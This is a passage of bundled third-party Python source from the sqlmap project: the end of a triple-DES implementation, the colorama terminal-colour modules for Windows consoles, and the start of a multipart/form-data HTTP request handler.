DECRYPT)\n\t\t\treturn self.__key3.crypt(data, ENCRYPT)\n\n\tdef decrypt(self, data, pad=None, padmode=None):\n\t\t\"\"\"decrypt(data, [pad], [padmode]) -> bytes\n\n\t\tdata : bytes to be encrypted\n\t\tpad  : Optional argument for decryption padding. Must only be one byte\n\t\tpadmode : Optional argument for overriding the padding mode.\n\n\t\tThe data must be a multiple of 8 bytes and will be decrypted\n\t\twith the already specified key. In PAD_NORMAL mode, if the\n\t\toptional padding character is supplied, then the un-encrypted\n\t\tdata will have the padding characters removed from the end of\n\t\tthe bytes. This pad removal only occurs on the last 8 bytes of\n\t\tthe data (last data block). In PAD_PKCS5 mode, the special\n\t\tpadding end markers will be removed from the data after\n\t\tdecrypting, no pad character is required for PAD_PKCS5.\n\t\t\"\"\"\n\t\tENCRYPT = des.ENCRYPT\n\t\tDECRYPT = des.DECRYPT\n\t\tdata = self._guardAgainstUnicode(data)\n\t\tif pad is not None:\n\t\t\tpad = self._guardAgainstUnicode(pad)\n\t\tif self.getMode() == CBC:\n\t\t\tself.__key1.setIV(self.getIV())\n\t\t\tself.__key2.setIV(self.getIV())\n\t\t\tself.__key3.setIV(self.getIV())\n\t\t\ti = 0\n\t\t\tresult = []\n\t\t\twhile i < len(data):\n\t\t\t\tiv = data[i:i+8]\n\t\t\t\tblock = self.__key3.crypt(iv,    DECRYPT)\n\t\t\t\tblock = self.__key2.crypt(block, ENCRYPT)\n\t\t\t\tblock = self.__key1.crypt(block, DECRYPT)\n\t\t\t\tself.__key1.setIV(iv)\n\t\t\t\tself.__key2.setIV(iv)\n\t\t\t\tself.__key3.setIV(iv)\n\t\t\t\tresult.append(block)\n\t\t\t\ti += 8\n\t\t\tif _pythonMajorVersion < 3:\n\t\t\t\tdata = ''.join(result)\n\t\t\telse:\n\t\t\t\tdata = bytes.fromhex('').join(result)\n\t\telse:\n\t\t\tdata = self.__key3.crypt(data, DECRYPT)\n\t\t\tdata = self.__key2.crypt(data, ENCRYPT)\n\t\t\tdata = self.__key1.crypt(data, DECRYPT)\n\t\treturn self._unpadData(data, pad, padmode)\n", "thirdparty/colorama/win32.py": "# Copyright Jonathan Hartley 2013. BSD 3-Clause license, see LICENSE file.\n\n# from winbase.h\nSTDOUT = -11\nSTDERR = -12\n\ntry:\n    import ctypes\n    from ctypes import LibraryLoader\n    windll = LibraryLoader(ctypes.WinDLL)\n    from ctypes import wintypes\nexcept (AttributeError, ImportError):\n    windll = None\n    SetConsoleTextAttribute = lambda *_: None\n    winapi_test = lambda *_: None\nelse:\n    from ctypes import byref, Structure, c_char, POINTER\n\n    COORD = wintypes._COORD\n\n    class CONSOLE_SCREEN_BUFFER_INFO(Structure):\n        \"\"\"struct in wincon.h.\"\"\"\n        _fields_ = [\n            (\"dwSize\", COORD),\n            (\"dwCursorPosition\", COORD),\n            (\"wAttributes\", wintypes.WORD),\n            (\"srWindow\", wintypes.SMALL_RECT),\n            (\"dwMaximumWindowSize\", COORD),\n        ]\n        def __str__(self):\n            return '(%d,%d,%d,%d,%d,%d,%d,%d,%d,%d,%d)' % (\n                self.dwSize.Y, self.dwSize.X\n                , self.dwCursorPosition.Y, self.dwCursorPosition.X\n                , self.wAttributes\n                , self.srWindow.Top, self.srWindow.Left, self.srWindow.Bottom, self.srWindow.Right\n                , self.dwMaximumWindowSize.Y, self.dwMaximumWindowSize.X\n            )\n\n    _GetStdHandle = windll.kernel32.GetStdHandle\n    _GetStdHandle.argtypes = [\n        wintypes.DWORD,\n    ]\n    _GetStdHandle.restype = wintypes.HANDLE\n\n    _GetConsoleScreenBufferInfo = windll.kernel32.GetConsoleScreenBufferInfo\n    _GetConsoleScreenBufferInfo.argtypes = [\n        wintypes.HANDLE,\n        POINTER(CONSOLE_SCREEN_BUFFER_INFO),\n    ]\n    _GetConsoleScreenBufferInfo.restype = wintypes.BOOL\n\n    _SetConsoleTextAttribute = windll.kernel32.SetConsoleTextAttribute\n    _SetConsoleTextAttribute.argtypes = [\n        wintypes.HANDLE,\n        wintypes.WORD,\n    ]\n    _SetConsoleTextAttribute.restype = wintypes.BOOL\n\n    _SetConsoleCursorPosition = windll.kernel32.SetConsoleCursorPosition\n    _SetConsoleCursorPosition.argtypes = [\n        wintypes.HANDLE,\n        COORD,\n    ]\n    _SetConsoleCursorPosition.restype = wintypes.BOOL\n\n    _FillConsoleOutputCharacterA = windll.kernel32.FillConsoleOutputCharacterA\n    _FillConsoleOutputCharacterA.argtypes = [\n        wintypes.HANDLE,\n        c_char,\n        wintypes.DWORD,\n        COORD,\n        POINTER(wintypes.DWORD),\n    ]\n    _FillConsoleOutputCharacterA.restype = wintypes.BOOL\n\n    _FillConsoleOutputAttribute = windll.kernel32.FillConsoleOutputAttribute\n    _FillConsoleOutputAttribute.argtypes = [\n        wintypes.HANDLE,\n        wintypes.WORD,\n        wintypes.DWORD,\n        COORD,\n        POINTER(wintypes.DWORD),\n    ]\n    _FillConsoleOutputAttribute.restype = wintypes.BOOL\n\n    _SetConsoleTitleW = windll.kernel32.SetConsoleTitleA\n    _SetConsoleTitleW.argtypes = [\n        wintypes.LPCSTR\n    ]\n    _SetConsoleTitleW.restype = wintypes.BOOL\n\n    handles = {\n        STDOUT: _GetStdHandle(STDOUT),\n        STDERR: _GetStdHandle(STDERR),\n    }\n\n    def winapi_test():\n        handle = handles[STDOUT]\n        csbi = CONSOLE_SCREEN_BUFFER_INFO()\n        success = _GetConsoleScreenBufferInfo(\n            handle, byref(csbi))\n        return bool(success)\n\n    def GetConsoleScreenBufferInfo(stream_id=STDOUT):\n        handle = handles[stream_id]\n        csbi = CONSOLE_SCREEN_BUFFER_INFO()\n        success = _GetConsoleScreenBufferInfo(\n            handle, byref(csbi))\n        return csbi\n\n    def SetConsoleTextAttribute(stream_id, attrs):\n        handle = handles[stream_id]\n        return _SetConsoleTextAttribute(handle, attrs)\n\n    def SetConsoleCursorPosition(stream_id, position, adjust=True):\n        position = COORD(*position)\n        # If the position is out of range, do nothing.\n        if position.Y <= 0 or position.X <= 0:\n            return\n        # Adjust for Windows' SetConsoleCursorPosition:\n        #    1. being 0-based, while ANSI is 1-based.\n        #    2. expecting (x,y), while ANSI uses (y,x).\n        adjusted_position = COORD(position.Y - 1, position.X - 1)\n        if adjust:\n            # Adjust for viewport's scroll position\n            sr = GetConsoleScreenBufferInfo(STDOUT).srWindow\n            adjusted_position.Y += sr.Top\n            adjusted_position.X += sr.Left\n        # Resume normal processing\n        handle = handles[stream_id]\n        return _SetConsoleCursorPosition(handle, adjusted_position)\n\n    def FillConsoleOutputCharacter(stream_id, char, length, start):\n        handle = handles[stream_id]\n        char = c_char(char.encode())\n        length = wintypes.DWORD(length)\n        num_written = wintypes.DWORD(0)\n        # Note that this is hard-coded for ANSI (vs wide) bytes.\n        success = _FillConsoleOutputCharacterA(\n            handle, char, length, start, byref(num_written))\n        return num_written.value\n\n    def FillConsoleOutputAttribute(stream_id, attr, length, start):\n        ''' FillConsoleOutputAttribute( hConsole, csbi.wAttributes, dwConSize, coordScreen, &cCharsWritten )'''\n        handle = handles[stream_id]\n        attribute = wintypes.WORD(attr)\n        length = wintypes.DWORD(length)\n        num_written = wintypes.DWORD(0)\n        # Note that this is hard-coded for ANSI (vs wide) bytes.\n        return _FillConsoleOutputAttribute(\n            handle, attribute, length, start, byref(num_written))\n\n    def SetConsoleTitle(title):\n        return _SetConsoleTitleW(title)\n", "thirdparty/colorama/ansitowin32.py": "# Copyright Jonathan Hartley 2013. BSD 3-Clause license, see LICENSE file.\nimport re\nimport sys\nimport os\n\nfrom .ansi import AnsiFore, AnsiBack, AnsiStyle, Style\nfrom .winterm import WinTerm, WinColor, WinStyle\nfrom .win32 import windll, winapi_test\n\n\nwinterm = None\nif windll is not None:\n    winterm = WinTerm()\n\n\ndef is_stream_closed(stream):\n    return not hasattr(stream, 'closed') or stream.closed\n\n\ndef is_a_tty(stream):\n    return hasattr(stream, 'isatty') and stream.isatty()\n\n\nclass StreamWrapper(object):\n    '''\n    Wraps a stream (such as stdout), acting as a transparent proxy for all\n    attribute access apart from method 'write()', which is delegated to our\n    Converter instance.\n    '''\n    def __init__(self, wrapped, converter):\n        # double-underscore everything to prevent clashes with names of\n        # attributes on the wrapped stream object.\n        self.__wrapped = wrapped\n        self.__convertor = converter\n\n    def __getattr__(self, name):\n        return getattr(self.__wrapped, name)\n\n    def write(self, text):\n        self.__convertor.write(text)\n\n\nclass AnsiToWin32(object):\n    '''\n    Implements a 'write()' method which, on Windows, will strip ANSI character\n    sequences from the text, and if outputting to a tty, will convert them into\n    win32 function calls.\n    '''\n    ANSI_CSI_RE = re.compile('\\001?\\033\\\\[((?:\\\\d|;)*)([a-zA-Z])\\002?')     # Control Sequence Introducer\n    ANSI_OSC_RE = re.compile('\\001?\\033\\\\]([^\\a]*)(\\a)\\002?')               # Operating System Command (Note: https://github.com/tartley/colorama/issues/247)\n\n    def __init__(self, wrapped, convert=None, strip=None, autoreset=False):\n        # The wrapped stream (normally sys.stdout or sys.stderr)\n        self.wrapped = wrapped\n\n        # should we reset colors to defaults after every .write()\n        self.autoreset = autoreset\n\n        # create the proxy wrapping our output stream\n        self.stream = StreamWrapper(wrapped, self)\n\n        on_windows = os.name == 'nt'\n        # We test if the WinAPI works, because even if we are on Windows\n        # we may be using a terminal that doesn't support the WinAPI\n        # (e.g. Cygwin Terminal). In this case it's up to the terminal\n        # to support the ANSI codes.\n        conversion_supported = on_windows and winapi_test()\n\n        # should we strip ANSI sequences from our output?\n        if strip is None:\n            strip = conversion_supported or (not is_stream_closed(wrapped) and not is_a_tty(wrapped))\n        self.strip = strip\n\n        # should we should convert ANSI sequences into win32 calls?\n        if convert is None:\n            convert = conversion_supported and not is_stream_closed(wrapped) and is_a_tty(wrapped)\n        self.convert = convert\n\n        # dict of ansi codes to win32 functions and parameters\n        self.win32_calls = self.get_win32_calls()\n\n        # are we wrapping stderr?\n        self.on_stderr = self.wrapped is sys.stderr\n\n    def should_wrap(self):\n        '''\n        True if this class is actually needed. If false, then the output\n        stream will not be affected, nor will win32 calls be issued, so\n        wrapping stdout is not actually required. This will generally be\n        False on non-Windows platforms, unless optional functionality like\n        autoreset has been requested using kwargs to init()\n        '''\n        return self.convert or self.strip or self.autoreset\n\n    def get_win32_calls(self):\n        if self.convert and winterm:\n            return {\n                AnsiStyle.RESET_ALL: (winterm.reset_all, ),\n                AnsiStyle.BRIGHT: (winterm.style, WinStyle.BRIGHT),\n                AnsiStyle.DIM: (winterm.style, WinStyle.NORMAL),\n                AnsiStyle.NORMAL: (winterm.style, WinStyle.NORMAL),\n                AnsiFore.BLACK: (winterm.fore, WinColor.BLACK),\n                AnsiFore.RED: (winterm.fore, WinColor.RED),\n                AnsiFore.GREEN: (winterm.fore, WinColor.GREEN),\n                AnsiFore.YELLOW: (winterm.fore, WinColor.YELLOW),\n                AnsiFore.BLUE: (winterm.fore, WinColor.BLUE),\n                AnsiFore.MAGENTA: (winterm.fore, WinColor.MAGENTA),\n                AnsiFore.CYAN: (winterm.fore, WinColor.CYAN),\n                AnsiFore.WHITE: (winterm.fore, WinColor.GREY),\n                AnsiFore.RESET: (winterm.fore, ),\n                AnsiFore.LIGHTBLACK_EX: (winterm.fore, WinColor.BLACK, True),\n                AnsiFore.LIGHTRED_EX: (winterm.fore, WinColor.RED, True),\n                AnsiFore.LIGHTGREEN_EX: (winterm.fore, WinColor.GREEN, True),\n                AnsiFore.LIGHTYELLOW_EX: (winterm.fore, WinColor.YELLOW, True),\n                AnsiFore.LIGHTBLUE_EX: (winterm.fore, WinColor.BLUE, True),\n                AnsiFore.LIGHTMAGENTA_EX: (winterm.fore, WinColor.MAGENTA, True),\n                AnsiFore.LIGHTCYAN_EX: (winterm.fore, WinColor.CYAN, True),\n                AnsiFore.LIGHTWHITE_EX: (winterm.fore, WinColor.GREY, True),\n                AnsiBack.BLACK: (winterm.back, WinColor.BLACK),\n                AnsiBack.RED: (winterm.back, WinColor.RED),\n                AnsiBack.GREEN: (winterm.back, WinColor.GREEN),\n                AnsiBack.YELLOW: (winterm.back, WinColor.YELLOW),\n                AnsiBack.BLUE: (winterm.back, WinColor.BLUE),\n                AnsiBack.MAGENTA: (winterm.back, WinColor.MAGENTA),\n                AnsiBack.CYAN: (winterm.back, WinColor.CYAN),\n                AnsiBack.WHITE: (winterm.back, WinColor.GREY),\n                AnsiBack.RESET: (winterm.back, ),\n                AnsiBack.LIGHTBLACK_EX: (winterm.back, WinColor.BLACK, True),\n                AnsiBack.LIGHTRED_EX: (winterm.back, WinColor.RED, True),\n                AnsiBack.LIGHTGREEN_EX: (winterm.back, WinColor.GREEN, True),\n                AnsiBack.LIGHTYELLOW_EX: (winterm.back, WinColor.YELLOW, True),\n                AnsiBack.LIGHTBLUE_EX: (winterm.back, WinColor.BLUE, True),\n                AnsiBack.LIGHTMAGENTA_EX: (winterm.back, WinColor.MAGENTA, True),\n                AnsiBack.LIGHTCYAN_EX: (winterm.back, WinColor.CYAN, True),\n                AnsiBack.LIGHTWHITE_EX: (winterm.back, WinColor.GREY, True),\n            }\n        return dict()\n\n    def write(self, text):\n        if self.strip or self.convert:\n            self.write_and_convert(text)\n        else:\n            self.wrapped.write(text)\n            self.wrapped.flush()\n        if self.autoreset:\n            self.reset_all()\n\n\n    def reset_all(self):\n        if self.convert:\n            self.call_win32('m', (0,))\n        elif not self.strip and not is_stream_closed(self.wrapped):\n            self.wrapped.write(Style.RESET_ALL)\n\n\n    def write_and_convert(self, text):\n        '''\n        Write the given text to our wrapped stream, stripping any ANSI\n        sequences from the text, and optionally converting them into win32\n        calls.\n        '''\n        cursor = 0\n        text = self.convert_osc(text)\n        for match in self.ANSI_CSI_RE.finditer(text):\n            start, end = match.span()\n            self.write_plain_text(text, cursor, start)\n            self.convert_ansi(*match.groups())\n            cursor = end\n        self.write_plain_text(text, cursor, len(text))\n\n\n    def write_plain_text(self, text, start, end):\n        if start < end:\n            self._write(text[start:end])\n            self.wrapped.flush()\n\n    # Reference: https://github.com/robotframework/robotframework/commit/828c67695d85519e4435c556c43ed1b00985df05\n    #  Workaround for Windows 10 console bug:\n    #  https://github.com/robotframework/robotframework/issues/2709\n    def _write(self, text, retry=5):\n        try:\n            self.wrapped.write(text)\n        except IOError as err:\n            if not (err.errno == 0 and retry > 0):\n                raise\n            self._write(text, retry-1)\n        except UnicodeError:\n            self.wrapped.write('?')\n\n    def convert_ansi(self, paramstring, command):\n        if self.convert:\n            params = self.extract_params(command, paramstring)\n            self.call_win32(command, params)\n\n\n    def extract_params(self, command, paramstring):\n        if command in 'Hf':\n            params = tuple(int(p) if len(p) != 0 else 1 for p in paramstring.split(';'))\n            while len(params) < 2:\n                # defaults:\n                params = params + (1,)\n        else:\n            params = tuple(int(p) for p in paramstring.split(';') if len(p) != 0)\n            if len(params) == 0:\n                # defaults:\n                if command in 'JKm':\n                    params = (0,)\n                elif command in 'ABCD':\n                    params = (1,)\n\n        return params\n\n\n    def call_win32(self, command, params):\n        if command == 'm':\n            for param in params:\n                if param in self.win32_calls:\n                    func_args = self.win32_calls[param]\n                    func = func_args[0]\n                    args = func_args[1:]\n                    kwargs = dict(on_stderr=self.on_stderr)\n                    func(*args, **kwargs)\n        elif command in 'J':\n            winterm.erase_screen(params[0], on_stderr=self.on_stderr)\n        elif command in 'K':\n            winterm.erase_line(params[0], on_stderr=self.on_stderr)\n        elif command in 'Hf':     # cursor position - absolute\n            winterm.set_cursor_position(params, on_stderr=self.on_stderr)\n        elif command in 'ABCD':   # cursor position - relative\n            n = params[0]\n            # A - up, B - down, C - forward, D - back\n            x, y = {'A': (0, -n), 'B': (0, n), 'C': (n, 0), 'D': (-n, 0)}[command]\n            winterm.cursor_adjust(x, y, on_stderr=self.on_stderr)\n\n\n    def convert_osc(self, text):\n        for match in self.ANSI_OSC_RE.finditer(text):\n            start, end = match.span()\n            text = text[:start] + text[end:]\n            paramstring, command = match.groups()\n            if command in '\\x07':       # \\x07 = BEL\n                params = paramstring.split(\";\")\n                # 0 - change title and icon (we will only change title)\n                # 1 - change icon (we don't support this)\n                # 2 - change title\n                if params[0] in '02':\n                    winterm.set_title(params[1])\n        return text\n", "thirdparty/colorama/ansi.py": "# Copyright Jonathan Hartley 2013. BSD 3-Clause license, see LICENSE file.\n'''\nThis module generates ANSI character codes to printing colors to terminals.\nSee: http://en.wikipedia.org/wiki/ANSI_escape_code\n'''\n\nCSI = '\\033['\nOSC = '\\033]'\nBEL = '\\007'\n\n\ndef code_to_chars(code):\n    return CSI + str(code) + 'm'\n\ndef set_title(title):\n    return OSC + '2;' + title + BEL\n\ndef clear_screen(mode=2):\n    return CSI + str(mode) + 'J'\n\ndef clear_line(mode=2):\n    return CSI + str(mode) + 'K'\n\n\nclass AnsiCodes(object):\n    def __init__(self):\n        # the subclasses declare class attributes which are numbers.\n        # Upon instantiation we define instance attributes, which are the same\n        # as the class attributes but wrapped with the ANSI escape sequence\n        for name in dir(self):\n            if not name.startswith('_'):\n                value = getattr(self, name)\n                setattr(self, name, code_to_chars(value))\n\n\nclass AnsiCursor(object):\n    def UP(self, n=1):\n        return CSI + str(n) + 'A'\n    def DOWN(self, n=1):\n        return CSI + str(n) + 'B'\n    def FORWARD(self, n=1):\n        return CSI + str(n) + 'C'\n    def BACK(self, n=1):\n        return CSI + str(n) + 'D'\n    def POS(self, x=1, y=1):\n        return CSI + str(y) + ';' + str(x) + 'H'\n\n\nclass AnsiFore(AnsiCodes):\n    BLACK           = 30\n    RED             = 31\n    GREEN           = 32\n    YELLOW          = 33\n    BLUE            = 34\n    MAGENTA         = 35\n    CYAN            = 36\n    WHITE           = 37\n    RESET           = 39\n\n    # These are fairly well supported, but not part of the standard.\n    LIGHTBLACK_EX   = 90\n    LIGHTRED_EX     = 91\n    LIGHTGREEN_EX   = 92\n    LIGHTYELLOW_EX  = 93\n    LIGHTBLUE_EX    = 94\n    LIGHTMAGENTA_EX = 95\n    LIGHTCYAN_EX    = 96\n    LIGHTWHITE_EX   = 97\n\n\nclass AnsiBack(AnsiCodes):\n    BLACK           = 40\n    RED             = 41\n    GREEN           = 42\n    YELLOW          = 43\n    BLUE            = 44\n    MAGENTA         = 45\n    CYAN            = 46\n    WHITE           = 47\n    RESET           = 49\n\n    # These are fairly well supported, but not part of the standard.\n    LIGHTBLACK_EX   = 100\n    LIGHTRED_EX     = 101\n    LIGHTGREEN_EX   = 102\n    LIGHTYELLOW_EX  = 103\n    LIGHTBLUE_EX    = 104\n    LIGHTMAGENTA_EX = 105\n    LIGHTCYAN_EX    = 106\n    LIGHTWHITE_EX   = 107\n\n\nclass AnsiStyle(AnsiCodes):\n    BRIGHT    = 1\n    DIM       = 2\n    NORMAL    = 22\n    RESET_ALL = 0\n\nFore   = AnsiFore()\nBack   = AnsiBack()\nStyle  = AnsiStyle()\nCursor = AnsiCursor()\n", "thirdparty/colorama/winterm.py": "# Copyright Jonathan Hartley 2013. BSD 3-Clause license, see LICENSE file.\nfrom . import win32\n\n\n# from wincon.h\nclass WinColor(object):\n    BLACK   = 0\n    BLUE    = 1\n    GREEN   = 2\n    CYAN    = 3\n    RED     = 4\n    MAGENTA = 5\n    YELLOW  = 6\n    GREY    = 7\n\n# from wincon.h\nclass WinStyle(object):\n    NORMAL              = 0x00 # dim text, dim background\n    BRIGHT              = 0x08 # bright text, dim background\n    BRIGHT_BACKGROUND   = 0x80 # dim text, bright background\n\nclass WinTerm(object):\n\n    def __init__(self):\n        self._default = win32.GetConsoleScreenBufferInfo(win32.STDOUT).wAttributes\n        self.set_attrs(self._default)\n        self._default_fore = self._fore\n        self._default_back = self._back\n        self._default_style = self._style\n        # In order to emulate LIGHT_EX in windows, we borrow the BRIGHT style.\n        # So that LIGHT_EX colors and BRIGHT style do not clobber each other,\n        # we track them separately, since LIGHT_EX is overwritten by Fore/Back\n        # and BRIGHT is overwritten by Style codes.\n        self._light = 0\n\n    def get_attrs(self):\n        return self._fore + self._back * 16 + (self._style | self._light)\n\n    def set_attrs(self, value):\n        self._fore = value & 7\n        self._back = (value >> 4) & 7\n        self._style = value & (WinStyle.BRIGHT | WinStyle.BRIGHT_BACKGROUND)\n\n    def reset_all(self, on_stderr=None):\n        self.set_attrs(self._default)\n        self.set_console(attrs=self._default)\n\n    def fore(self, fore=None, light=False, on_stderr=False):\n        if fore is None:\n            fore = self._default_fore\n        self._fore = fore\n        # Emulate LIGHT_EX with BRIGHT Style\n        if light:\n            self._light |= WinStyle.BRIGHT\n        else:\n            self._light &= ~WinStyle.BRIGHT\n        self.set_console(on_stderr=on_stderr)\n\n    def back(self, back=None, light=False, on_stderr=False):\n        if back is None:\n            back = self._default_back\n        self._back = back\n        # Emulate LIGHT_EX with BRIGHT_BACKGROUND Style\n        if light:\n            self._light |= WinStyle.BRIGHT_BACKGROUND\n        else:\n            self._light &= ~WinStyle.BRIGHT_BACKGROUND\n        self.set_console(on_stderr=on_stderr)\n\n    def style(self, style=None, on_stderr=False):\n        if style is None:\n            style = self._default_style\n        self._style = style\n        self.set_console(on_stderr=on_stderr)\n\n    def set_console(self, attrs=None, on_stderr=False):\n        if attrs is None:\n            attrs = self.get_attrs()\n        handle = win32.STDOUT\n        if on_stderr:\n            handle = win32.STDERR\n        win32.SetConsoleTextAttribute(handle, attrs)\n\n    def get_position(self, handle):\n        position = win32.GetConsoleScreenBufferInfo(handle).dwCursorPosition\n        # Because Windows coordinates are 0-based,\n        # and win32.SetConsoleCursorPosition expects 1-based.\n        position.X += 1\n        position.Y += 1\n        return position\n\n    def set_cursor_position(self, position=None, on_stderr=False):\n        if position is None:\n            # I'm not currently tracking the position, so there is no default.\n            # position = self.get_position()\n            return\n        handle = win32.STDOUT\n        if on_stderr:\n            handle = win32.STDERR\n        win32.SetConsoleCursorPosition(handle, position)\n\n    def cursor_adjust(self, x, y, on_stderr=False):\n        handle = win32.STDOUT\n        if on_stderr:\n            handle = win32.STDERR\n        position = self.get_position(handle)\n        adjusted_position = (position.Y + y, position.X + x)\n        win32.SetConsoleCursorPosition(handle, adjusted_position, adjust=False)\n\n    def erase_screen(self, mode=0, on_stderr=False):\n        # 0 should clear from the cursor to the end of the screen.\n        # 1 should clear from the cursor to the beginning of the screen.\n        # 2 should clear the entire screen, and move cursor to (1,1)\n        handle = win32.STDOUT\n        if on_stderr:\n            handle = win32.STDERR\n        csbi = win32.GetConsoleScreenBufferInfo(handle)\n        # get the number of character cells in the current buffer\n        cells_in_screen = csbi.dwSize.X * csbi.dwSize.Y\n        # get number of character cells before current cursor position\n        cells_before_cursor = csbi.dwSize.X * csbi.dwCursorPosition.Y + csbi.dwCursorPosition.X\n        if mode == 0:\n            from_coord = csbi.dwCursorPosition\n            cells_to_erase = cells_in_screen - cells_before_cursor\n        if mode == 1:\n            from_coord = win32.COORD(0, 0)\n            cells_to_erase = cells_before_cursor\n        elif mode == 2:\n            from_coord = win32.COORD(0, 0)\n            cells_to_erase = cells_in_screen\n        else:\n            return\n        # fill the entire screen with blanks\n        win32.FillConsoleOutputCharacter(handle, ' ', cells_to_erase, from_coord)\n        # now set the buffer's attributes accordingly\n        win32.FillConsoleOutputAttribute(handle, self.get_attrs(), cells_to_erase, from_coord)\n        if mode == 2:\n            # put the cursor where needed\n            win32.SetConsoleCursorPosition(handle, (1, 1))\n\n    def erase_line(self, mode=0, on_stderr=False):\n        # 0 should clear from the cursor to the end of the line.\n        # 1 should clear from the cursor to the beginning of the line.\n        # 2 should clear the entire line.\n        handle = win32.STDOUT\n        if on_stderr:\n            handle = win32.STDERR\n        csbi = win32.GetConsoleScreenBufferInfo(handle)\n        if mode == 0:\n            from_coord = csbi.dwCursorPosition\n            cells_to_erase = csbi.dwSize.X - csbi.dwCursorPosition.X\n        if mode == 1:\n            from_coord = win32.COORD(0, csbi.dwCursorPosition.Y)\n            cells_to_erase = csbi.dwCursorPosition.X\n        elif mode == 2:\n            from_coord = win32.COORD(0, csbi.dwCursorPosition.Y)\n            cells_to_erase = csbi.dwSize.X\n        else:\n            return\n        # fill the entire screen with blanks\n        win32.FillConsoleOutputCharacter(handle, ' ', cells_to_erase, from_coord)\n        # now set the buffer's attributes accordingly\n        win32.FillConsoleOutputAttribute(handle, self.get_attrs(), cells_to_erase, from_coord)\n\n    def set_title(self, title):\n        win32.SetConsoleTitle(title)\n", "thirdparty/colorama/initialise.py": "# Copyright Jonathan Hartley 2013. BSD 3-Clause license, see LICENSE file.\nimport atexit\nimport contextlib\nimport sys\n\nfrom .ansitowin32 import AnsiToWin32\n\n\norig_stdout = None\norig_stderr = None\n\nwrapped_stdout = None\nwrapped_stderr = None\n\natexit_done = False\n\n\ndef reset_all():\n    if AnsiToWin32 is not None:    # Issue #74: objects might become None at exit\n        AnsiToWin32(orig_stdout).reset_all()\n\n\ndef init(autoreset=False, convert=None, strip=None, wrap=True):\n    global wrapped_stdout, wrapped_stderr\n    global orig_stdout, orig_stderr\n\n    if orig_stdout is not None:\n        return\n\n    if not wrap and any([autoreset, convert, strip]):\n        raise ValueError('wrap=False conflicts with any other arg=True')\n\n    orig_stdout = sys.stdout\n    orig_stderr = sys.stderr\n\n    if sys.stdout is None:\n        wrapped_stdout = None\n    else:\n        sys.stdout = wrapped_stdout = \\\n            wrap_stream(orig_stdout, convert, strip, autoreset, wrap)\n    if sys.stderr is None:\n        wrapped_stderr = None\n    else:\n        sys.stderr = wrapped_stderr = \\\n            wrap_stream(orig_stderr, convert, strip, autoreset, wrap)\n\n    global atexit_done\n    if not atexit_done:\n        atexit.register(reset_all)\n        atexit_done = True\n\n\ndef deinit():\n    global orig_stdout\n    global orig_stderr\n\n    if orig_stdout is not None:\n        sys.stdout = orig_stdout\n        orig_stdout = None\n    if orig_stderr is not None:\n        sys.stderr = orig_stderr\n        orig_stderr = None\n\n\n@contextlib.contextmanager\ndef colorama_text(*args, **kwargs):\n    init(*args, **kwargs)\n    try:\n        yield\n    finally:\n        deinit()\n\n\ndef reinit():\n    if wrapped_stdout is not None:\n        sys.stdout = wrapped_stdout\n    if wrapped_stderr is not None:\n        sys.stderr = wrapped_stderr\n\n\ndef wrap_stream(stream, convert, strip, autoreset, wrap):\n    if wrap:\n        wrapper = AnsiToWin32(stream,\n            convert=convert, strip=strip, autoreset=autoreset)\n        if wrapper.should_wrap():\n            stream = wrapper.stream\n    return stream\n\n\n", "thirdparty/colorama/__init__.py": "# Copyright Jonathan Hartley 2013. BSD 3-Clause license, see LICENSE file.\nfrom .initialise import init, deinit, reinit, colorama_text\nfrom .ansi import Fore, Back, Style, Cursor\nfrom .ansitowin32 import AnsiToWin32\n\n__version__ = '0.3.7'\n\n", "thirdparty/multipart/__init__.py": "", "thirdparty/multipart/multipartpost.py": "#!/usr/bin/env python\n\n\"\"\"\n02/2006 Will Holcomb <wholcomb@gmail.com>\n\nReference: http://odin.himinbi.org/MultipartPostHandler.py\n\nThis library is free software; you can redistribute it and/or\nmodify it under the terms of the GNU Lesser General Public\nLicense as published by the Free Software Foundation; either\nversion 2.1 of the License, or (at your option) any later version.\n\nThis library is distributed in the hope that it will be useful,\nbut WITHOUT ANY WARRANTY; without even the implied warranty of\nMERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU\nLesser General Public License for more details.\n\nYou should have received a copy of the GNU Lesser General Public\nLicense along with this library; if not, write to the Free Software\nFoundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA\n\"\"\"\n\nimport io\nimport mimetypes\nimport os\nimport re\nimport stat\nimport sys\n\nfrom lib.core.compat import choose_boundary\nfrom lib.core.convert import getBytes\nfrom lib.core.exception import SqlmapDataException\nfrom thirdparty.six.moves import urllib as _urllib\n\n# Controls how sequences are uncoded. If true, elements may be given\n# multiple values by assigning a sequence.\ndoseq = 1\n\n\nclass MultipartPostHandler(_urllib.request.BaseHandler):\n    handler_order = _urllib.request.HTTPHandler.handler_order - 10 # needs to run first\n\n    def http_request(self, request):\n        data = request.data\n\n        if isinstance(data, dict):\n            v_files = []\n            v_vars = []\n\n            try:\n                for(key, value) in data.items():\n                    if hasattr(value, \"fileno\") or hasattr(value, \"file\") or isinstance(value, io.IOBase):\n                        v_files.append((key, value))\n                    else:\n                        v_vars.append((key, value))\n            except TypeError:\n                systype, value, traceback = sys.exc_info()\n                raise SqlmapDataException(\"not a valid non-string sequence or mapping object '%s'\" % traceback)\n\n            if len(v_files) == 0:\n                data = _urllib.parse.urlencode(v_vars, doseq)\n            else:\n                boundary, data = self.multipart_encode(v_vars, v_files)\n                contenttype = \"multipart/form-data; boundary=%s\" % boundary\n                #if (request.has_header(\"Content-Type\") and request.get_header(\"Content-Type\").find(\"multipart/form-data\") != 0):\n                #    print \"Replacing %s with %s\" % (request.get_header(\"content-type\"), \"multipart/form-data\")\n                request.add_unredirected_header(\"Content-Type\", contenttype)\n\n            request.data = data\n\n        # NOTE: https://github.com/sqlmapproject/sqlmap/issues/4235\n        if request.data:\n            for match in re.finditer(b\"(?i)\\\\s*-{20,}\\\\w+(\\\\s+Content-Disposition[^\\\\n]+\\\\s+|\\\\-\\\\-\\\\s*)\", request.data):\n                part = match.group(0)\n                if b'\\r' not in part:\n                    request.data = request.data.replace(part, part.replace(b'\\n', b\"\\r\\n\"))\n\n        return request\n\n    def multipart_encode(self, vars, files, boundary=None, buf=None):\n        if boundary is None:\n            boundary = choose_boundary()\n\n        if buf is None:\n            buf = b\"\"\n\n        for (key, value) in vars:\n            if key is not None and value is not None:\n                buf += b\"--%s\\r\\n\" % getBytes(boundary)\n                buf += b\"Content-Disposition: form-data; name=\\\"%s\\\"\" % getBytes(key)\n                buf += b\"\\r\\n\\r\\n\" + getBytes(value) + b\"\\r\\n\"\n\n        for (key, fd) in files:\n            file_size = 